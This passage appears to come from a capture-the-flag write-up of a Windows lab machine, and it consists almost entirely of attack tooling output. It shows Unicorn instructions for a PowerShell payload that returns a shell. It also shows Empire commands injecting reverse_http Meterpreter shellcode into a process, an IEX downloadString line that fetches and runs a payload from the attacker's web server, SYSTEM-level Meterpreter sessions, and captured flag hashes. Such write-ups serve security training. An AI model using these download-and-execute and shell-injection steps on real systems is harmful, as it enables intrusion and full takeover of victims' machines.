        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=


Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave

Happy Magic Unicorns.

[********************************************************************************************************]

				-----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.

Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************]

[*] Exported powershell output code to powershell_attack.txt.
[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.


root@kali:~/Desktop/unicorn#
```

```sh
(Empire: agents) > interact NGXZ1YAK
(Empire: listeners) > uselistener meterpreter
(Empire: listeners/meterpreter) > set Host http://10.10.14.234:8002
(Empire: listeners/meterpreter) > set Port 8002
(Empire: listeners/meterpreter) > info

    Name: Meterpreter
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a 'foreign' http[s] Meterpreter listener.

Meterpreter Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Host              True        http://10.10.14.234:8002         Hostname/IP for staging.
  Name              True        meterpreter11                    Name for the listener.
  Port              True        8002                             Port for the listener.


(Empire: listeners/meterpreter) > execute
[*] Starting listener 'meterpreter111'
[+] Listener successfully started!
(Empire: listeners/meterpreter) >
(Empire: listeners/meterpreter) > back
(Empire: listeners) > back
(Empire: agents) > interact NGXZ1YAK
(Empire: NGXZ1YAK) > ps
(Empire: NGXZ1YAK) >
ProcessName                 PID Arch            UserName        MemUsage
-----------                 --- ----            --------        --------
Idle                          0 x64             N/A             0.02 MB
System                        4 x64             NT AUTHORITY\SY 1.14 MB
                                                STEM
powershell                  220 x64             NT AUTHORITY\SY 48.58 MB
                                                STEM
smss                        288 x64             NT AUTHORITY\SY 0.87 MB
                                                STEM
svchost                     344 x64             NT AUTHORITY\NE 22.06 MB
                                                TWORK SERVICE
conhost                     364 x64             NT AUTHORITY\SY 3.13 MB
                                                STEM
csrss                       372 x64             NT AUTHORITY\SY 4.22 MB
                                                STEM
wininit                     424 x64             NT AUTHORITY\SY 3.80 MB
                                                STEM
csrss                       436 x64             NT AUTHORITY\SY 2.69 MB
                                                STEM
winlogon                    468 x64             NT AUTHORITY\SY 5.02 MB
                                                STEM
services                    524 x64             NT AUTHORITY\SY 7.22 MB
                                                STEM
lsass                       540 x64             NT AUTHORITY\SY 9.73 MB
                                                STEM
lsm                         548 x64             NT AUTHORITY\SY 3.15 MB
                                                STEM
svchost                     644 x64             NT AUTHORITY\SY 8.11 MB
                                                STEM
svchost                     724 x64             NT AUTHORITY\NE 6.74 MB
                                                TWORK SERVICE
LogonUI                     816 x64             NT AUTHORITY\SY 19.78 MB
                                                STEM
svchost                     824 x64             NT AUTHORITY\LO 13.49 MB
                                                CAL SERVICE
svchost                     864 x64             NT AUTHORITY\SY 61.95 MB
                                                STEM
svchost                     904 x64             NT AUTHORITY\LO 10.41 MB
                                                CAL SERVICE
svchost                     928 x64             NT AUTHORITY\SY 32.08 MB
                                                STEM
spoolsv                    1056 x64             NT AUTHORITY\SY 13.01 MB
                                                STEM
svchost                    1096 x64             NT AUTHORITY\LO 8.96 MB
                                                CAL SERVICE
msdtc                      1172 x64             NT AUTHORITY\NE 5.51 MB
                                                TWORK SERVICE
svchost                    1204 x64             NT AUTHORITY\SY 7.11 MB
                                                STEM
powershell                 1268 x64             NT AUTHORITY\SY 66.28 MB
                                                STEM
VGAuthService              1308 x64             NT AUTHORITY\SY 4.89 MB
                                                STEM
vmtoolsd                   1392 x64             NT AUTHORITY\SY 13.84 MB
                                                STEM
ManagementAgent            1424 x64             NT AUTHORITY\SY 5.71 MB
Host                                            STEM
powershell                 1672 x64             NT AUTHORITY\SY 45.59 MB
                                                STEM
svchost                    1772 x64             NT AUTHORITY\NE 4.63 MB
                                                TWORK SERVICE
cmd                        1812 x64             NT AUTHORITY\SY 3.19 MB
                                                STEM
powershell                 1840 x64             NT AUTHORITY\SY 75.71 MB
                                                STEM
conhost                    1964 x64             NT AUTHORITY\SY 3.14 MB
                                                STEM
WmiPrvSE                   2008 x64             N/A             16.70 MB
powershell                 2220 x64             NT AUTHORITY\SY 45.62 MB
                                                STEM
cmd                        2240 x64             NT AUTHORITY\SY 3.02 MB
                                                STEM
cmd                        2316 x64             NT AUTHORITY\SY 3.05 MB
                                                STEM
conhost                    2424 x64             NT AUTHORITY\SY 3.08 MB
                                                STEM
powershell                 2452 x64             NT AUTHORITY\SY 48.60 MB
                                                STEM
conhost                    2468 x64             NT AUTHORITY\SY 3.16 MB
                                                STEM
conhost                    2476 x64             NT AUTHORITY\SY 2.91 MB
                                                STEM
powershell                 2532 x86             NT AUTHORITY\SY 37.19 MB
                                                STEM
powershell                 2544 x64             NT AUTHORITY\SY 48.77 MB
                                                STEM
powershell                 2604 x64             NT AUTHORITY\SY 45.63 MB
                                                STEM
cmd                        2620 x64             NT AUTHORITY\SY 3.03 MB
                                                STEM
svchost                    2772 x64             NT AUTHORITY\SY 51.97 MB
                                                STEM
SearchIndexer              2872 x64             NT AUTHORITY\SY 12.57 MB
                                                STEM
powershell                 2952 x64             NT AUTHORITY\SY 116.02 MB
                                                STEM
conhost                    2960 x64             NT AUTHORITY\SY 3.12 MB
                                                STEM

(Empire: NGXZ1YAK) > injectshellcode meterpreter11 2604
(Empire: powershell/code_execution/invoke_shellcode) > set Payload reverse_http
(Empire: powershell/code_execution/invoke_shellcode) > set Lhost 10.10.14.234
(Empire: powershell/code_execution/invoke_shellcode) > set Lport 8002
(Empire: powershell/code_execution/invoke_shellcode) > info

              Name: Invoke-Shellcode
            Module: powershell/code_execution/invoke_shellcode
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @mattifestation

Description:
  Uses PowerSploit's Invoke--Shellcode to inject shellcode
  into the process ID of your choosing or within the context
  of the running PowerShell process. If you're injecting
  custom shellcode, make sure it's in the correct format and
  matches the architecture of the process you're injecting
  into.

Comments:
  http://www.exploit-monday.com https://github.com/mattifestat
  ion/PowerSploit/blob/master/CodeExecution/Invoke-
  Shellcode.ps1

Options:

  Name      Required    Value                     Description
  ----      --------    -------                   -----------
  ProcessID False       2604                      Process ID of the process you want to
                                                  inject shellcode into.
  Lhost     False       10.10.14.234              Local host handler for the meterpreter
                                                  shell.
  Agent     True        NGXZ1YAK                  Agent to run module on.
  Listener  False       meterpreter11             Meterpreter/Beacon listener name.
  Lport     False       8002                      Local port of the host handler.
  Shellcode False                                 Custom shellcode to inject,
                                                  0xaa,0xab,... format.
  Payload   False       reverse_http              Metasploit payload to inject
                                                  (reverse_http[s]).

(Empire: powershell/code_execution/invoke_shellcode) > execute
(Empire: powershell/code_execution/invoke_shellcode) >
Job started: F7X6SG

Shellcode injected.


(Empire: powershell/code_execution/invoke_shellcode) >
```

```sh
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 4.

[*] Started HTTP reverse handler on http://10.10.14.234:8002
msf exploit(multi/handler) > [*] http://10.10.14.234:8002 handling request from 10.10.10.40; (UUID: mb7pmmcf) Staging x86 payload (180825 bytes) ...
[*] Meterpreter session 4 opened (10.10.14.234:8002 -> 10.10.10.40:51882) at 2018-01-19 18:13:56 -0500

msf exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  4         meterpreter x86/windows               10.10.14.234:8002 -> 10.10.10.40:51882 (10.10.10.40)

msf exploit(multi/handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel

meterpreter >
```

```sh
root@kali:~/Desktop/unicorn# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.40 - - [19/Jan/2018 14:04:53] "GET /powershell_attack.txt HTTP/1.1" 200 -
```

```sh
(Empire: NGXZ1YAK) > shell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.234:8000/powershell_attack.txt')
```

```sh
msf exploit(multi/handler) >
[*] http://10.10.14.234:8002 handling request from 10.10.10.40; (UUID: mb7pmmcf) Staging x86 payload (180825 bytes) ...
[*] Meterpreter session 5 opened (10.10.14.234:8002 -> 10.10.10.40:52185) at 2018-01-19 18:20:17 -0500

msf exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  4         meterpreter x86/windows                                  10.10.14.234:8002 -> 10.10.10.40:51882 (10.10.10.40)
  5         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ HARIS-PC  10.10.14.234:8002 -> 10.10.10.40:52185 (10.10.10.40)

msf exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes

meterpreter >
```

```
c:\Users\haris\Desktop>type user.txt
type user.txt
4c546aea7dbee75cbd71de245c8deea9
c:\Users\haris\Desktop>
```


```
c:\Users\Administrator\Desktop>type root.txt
type root.txt
ff548eb71e920ff6c08843ce9df4e717
c:\Users\Administrator\Desktop>
```
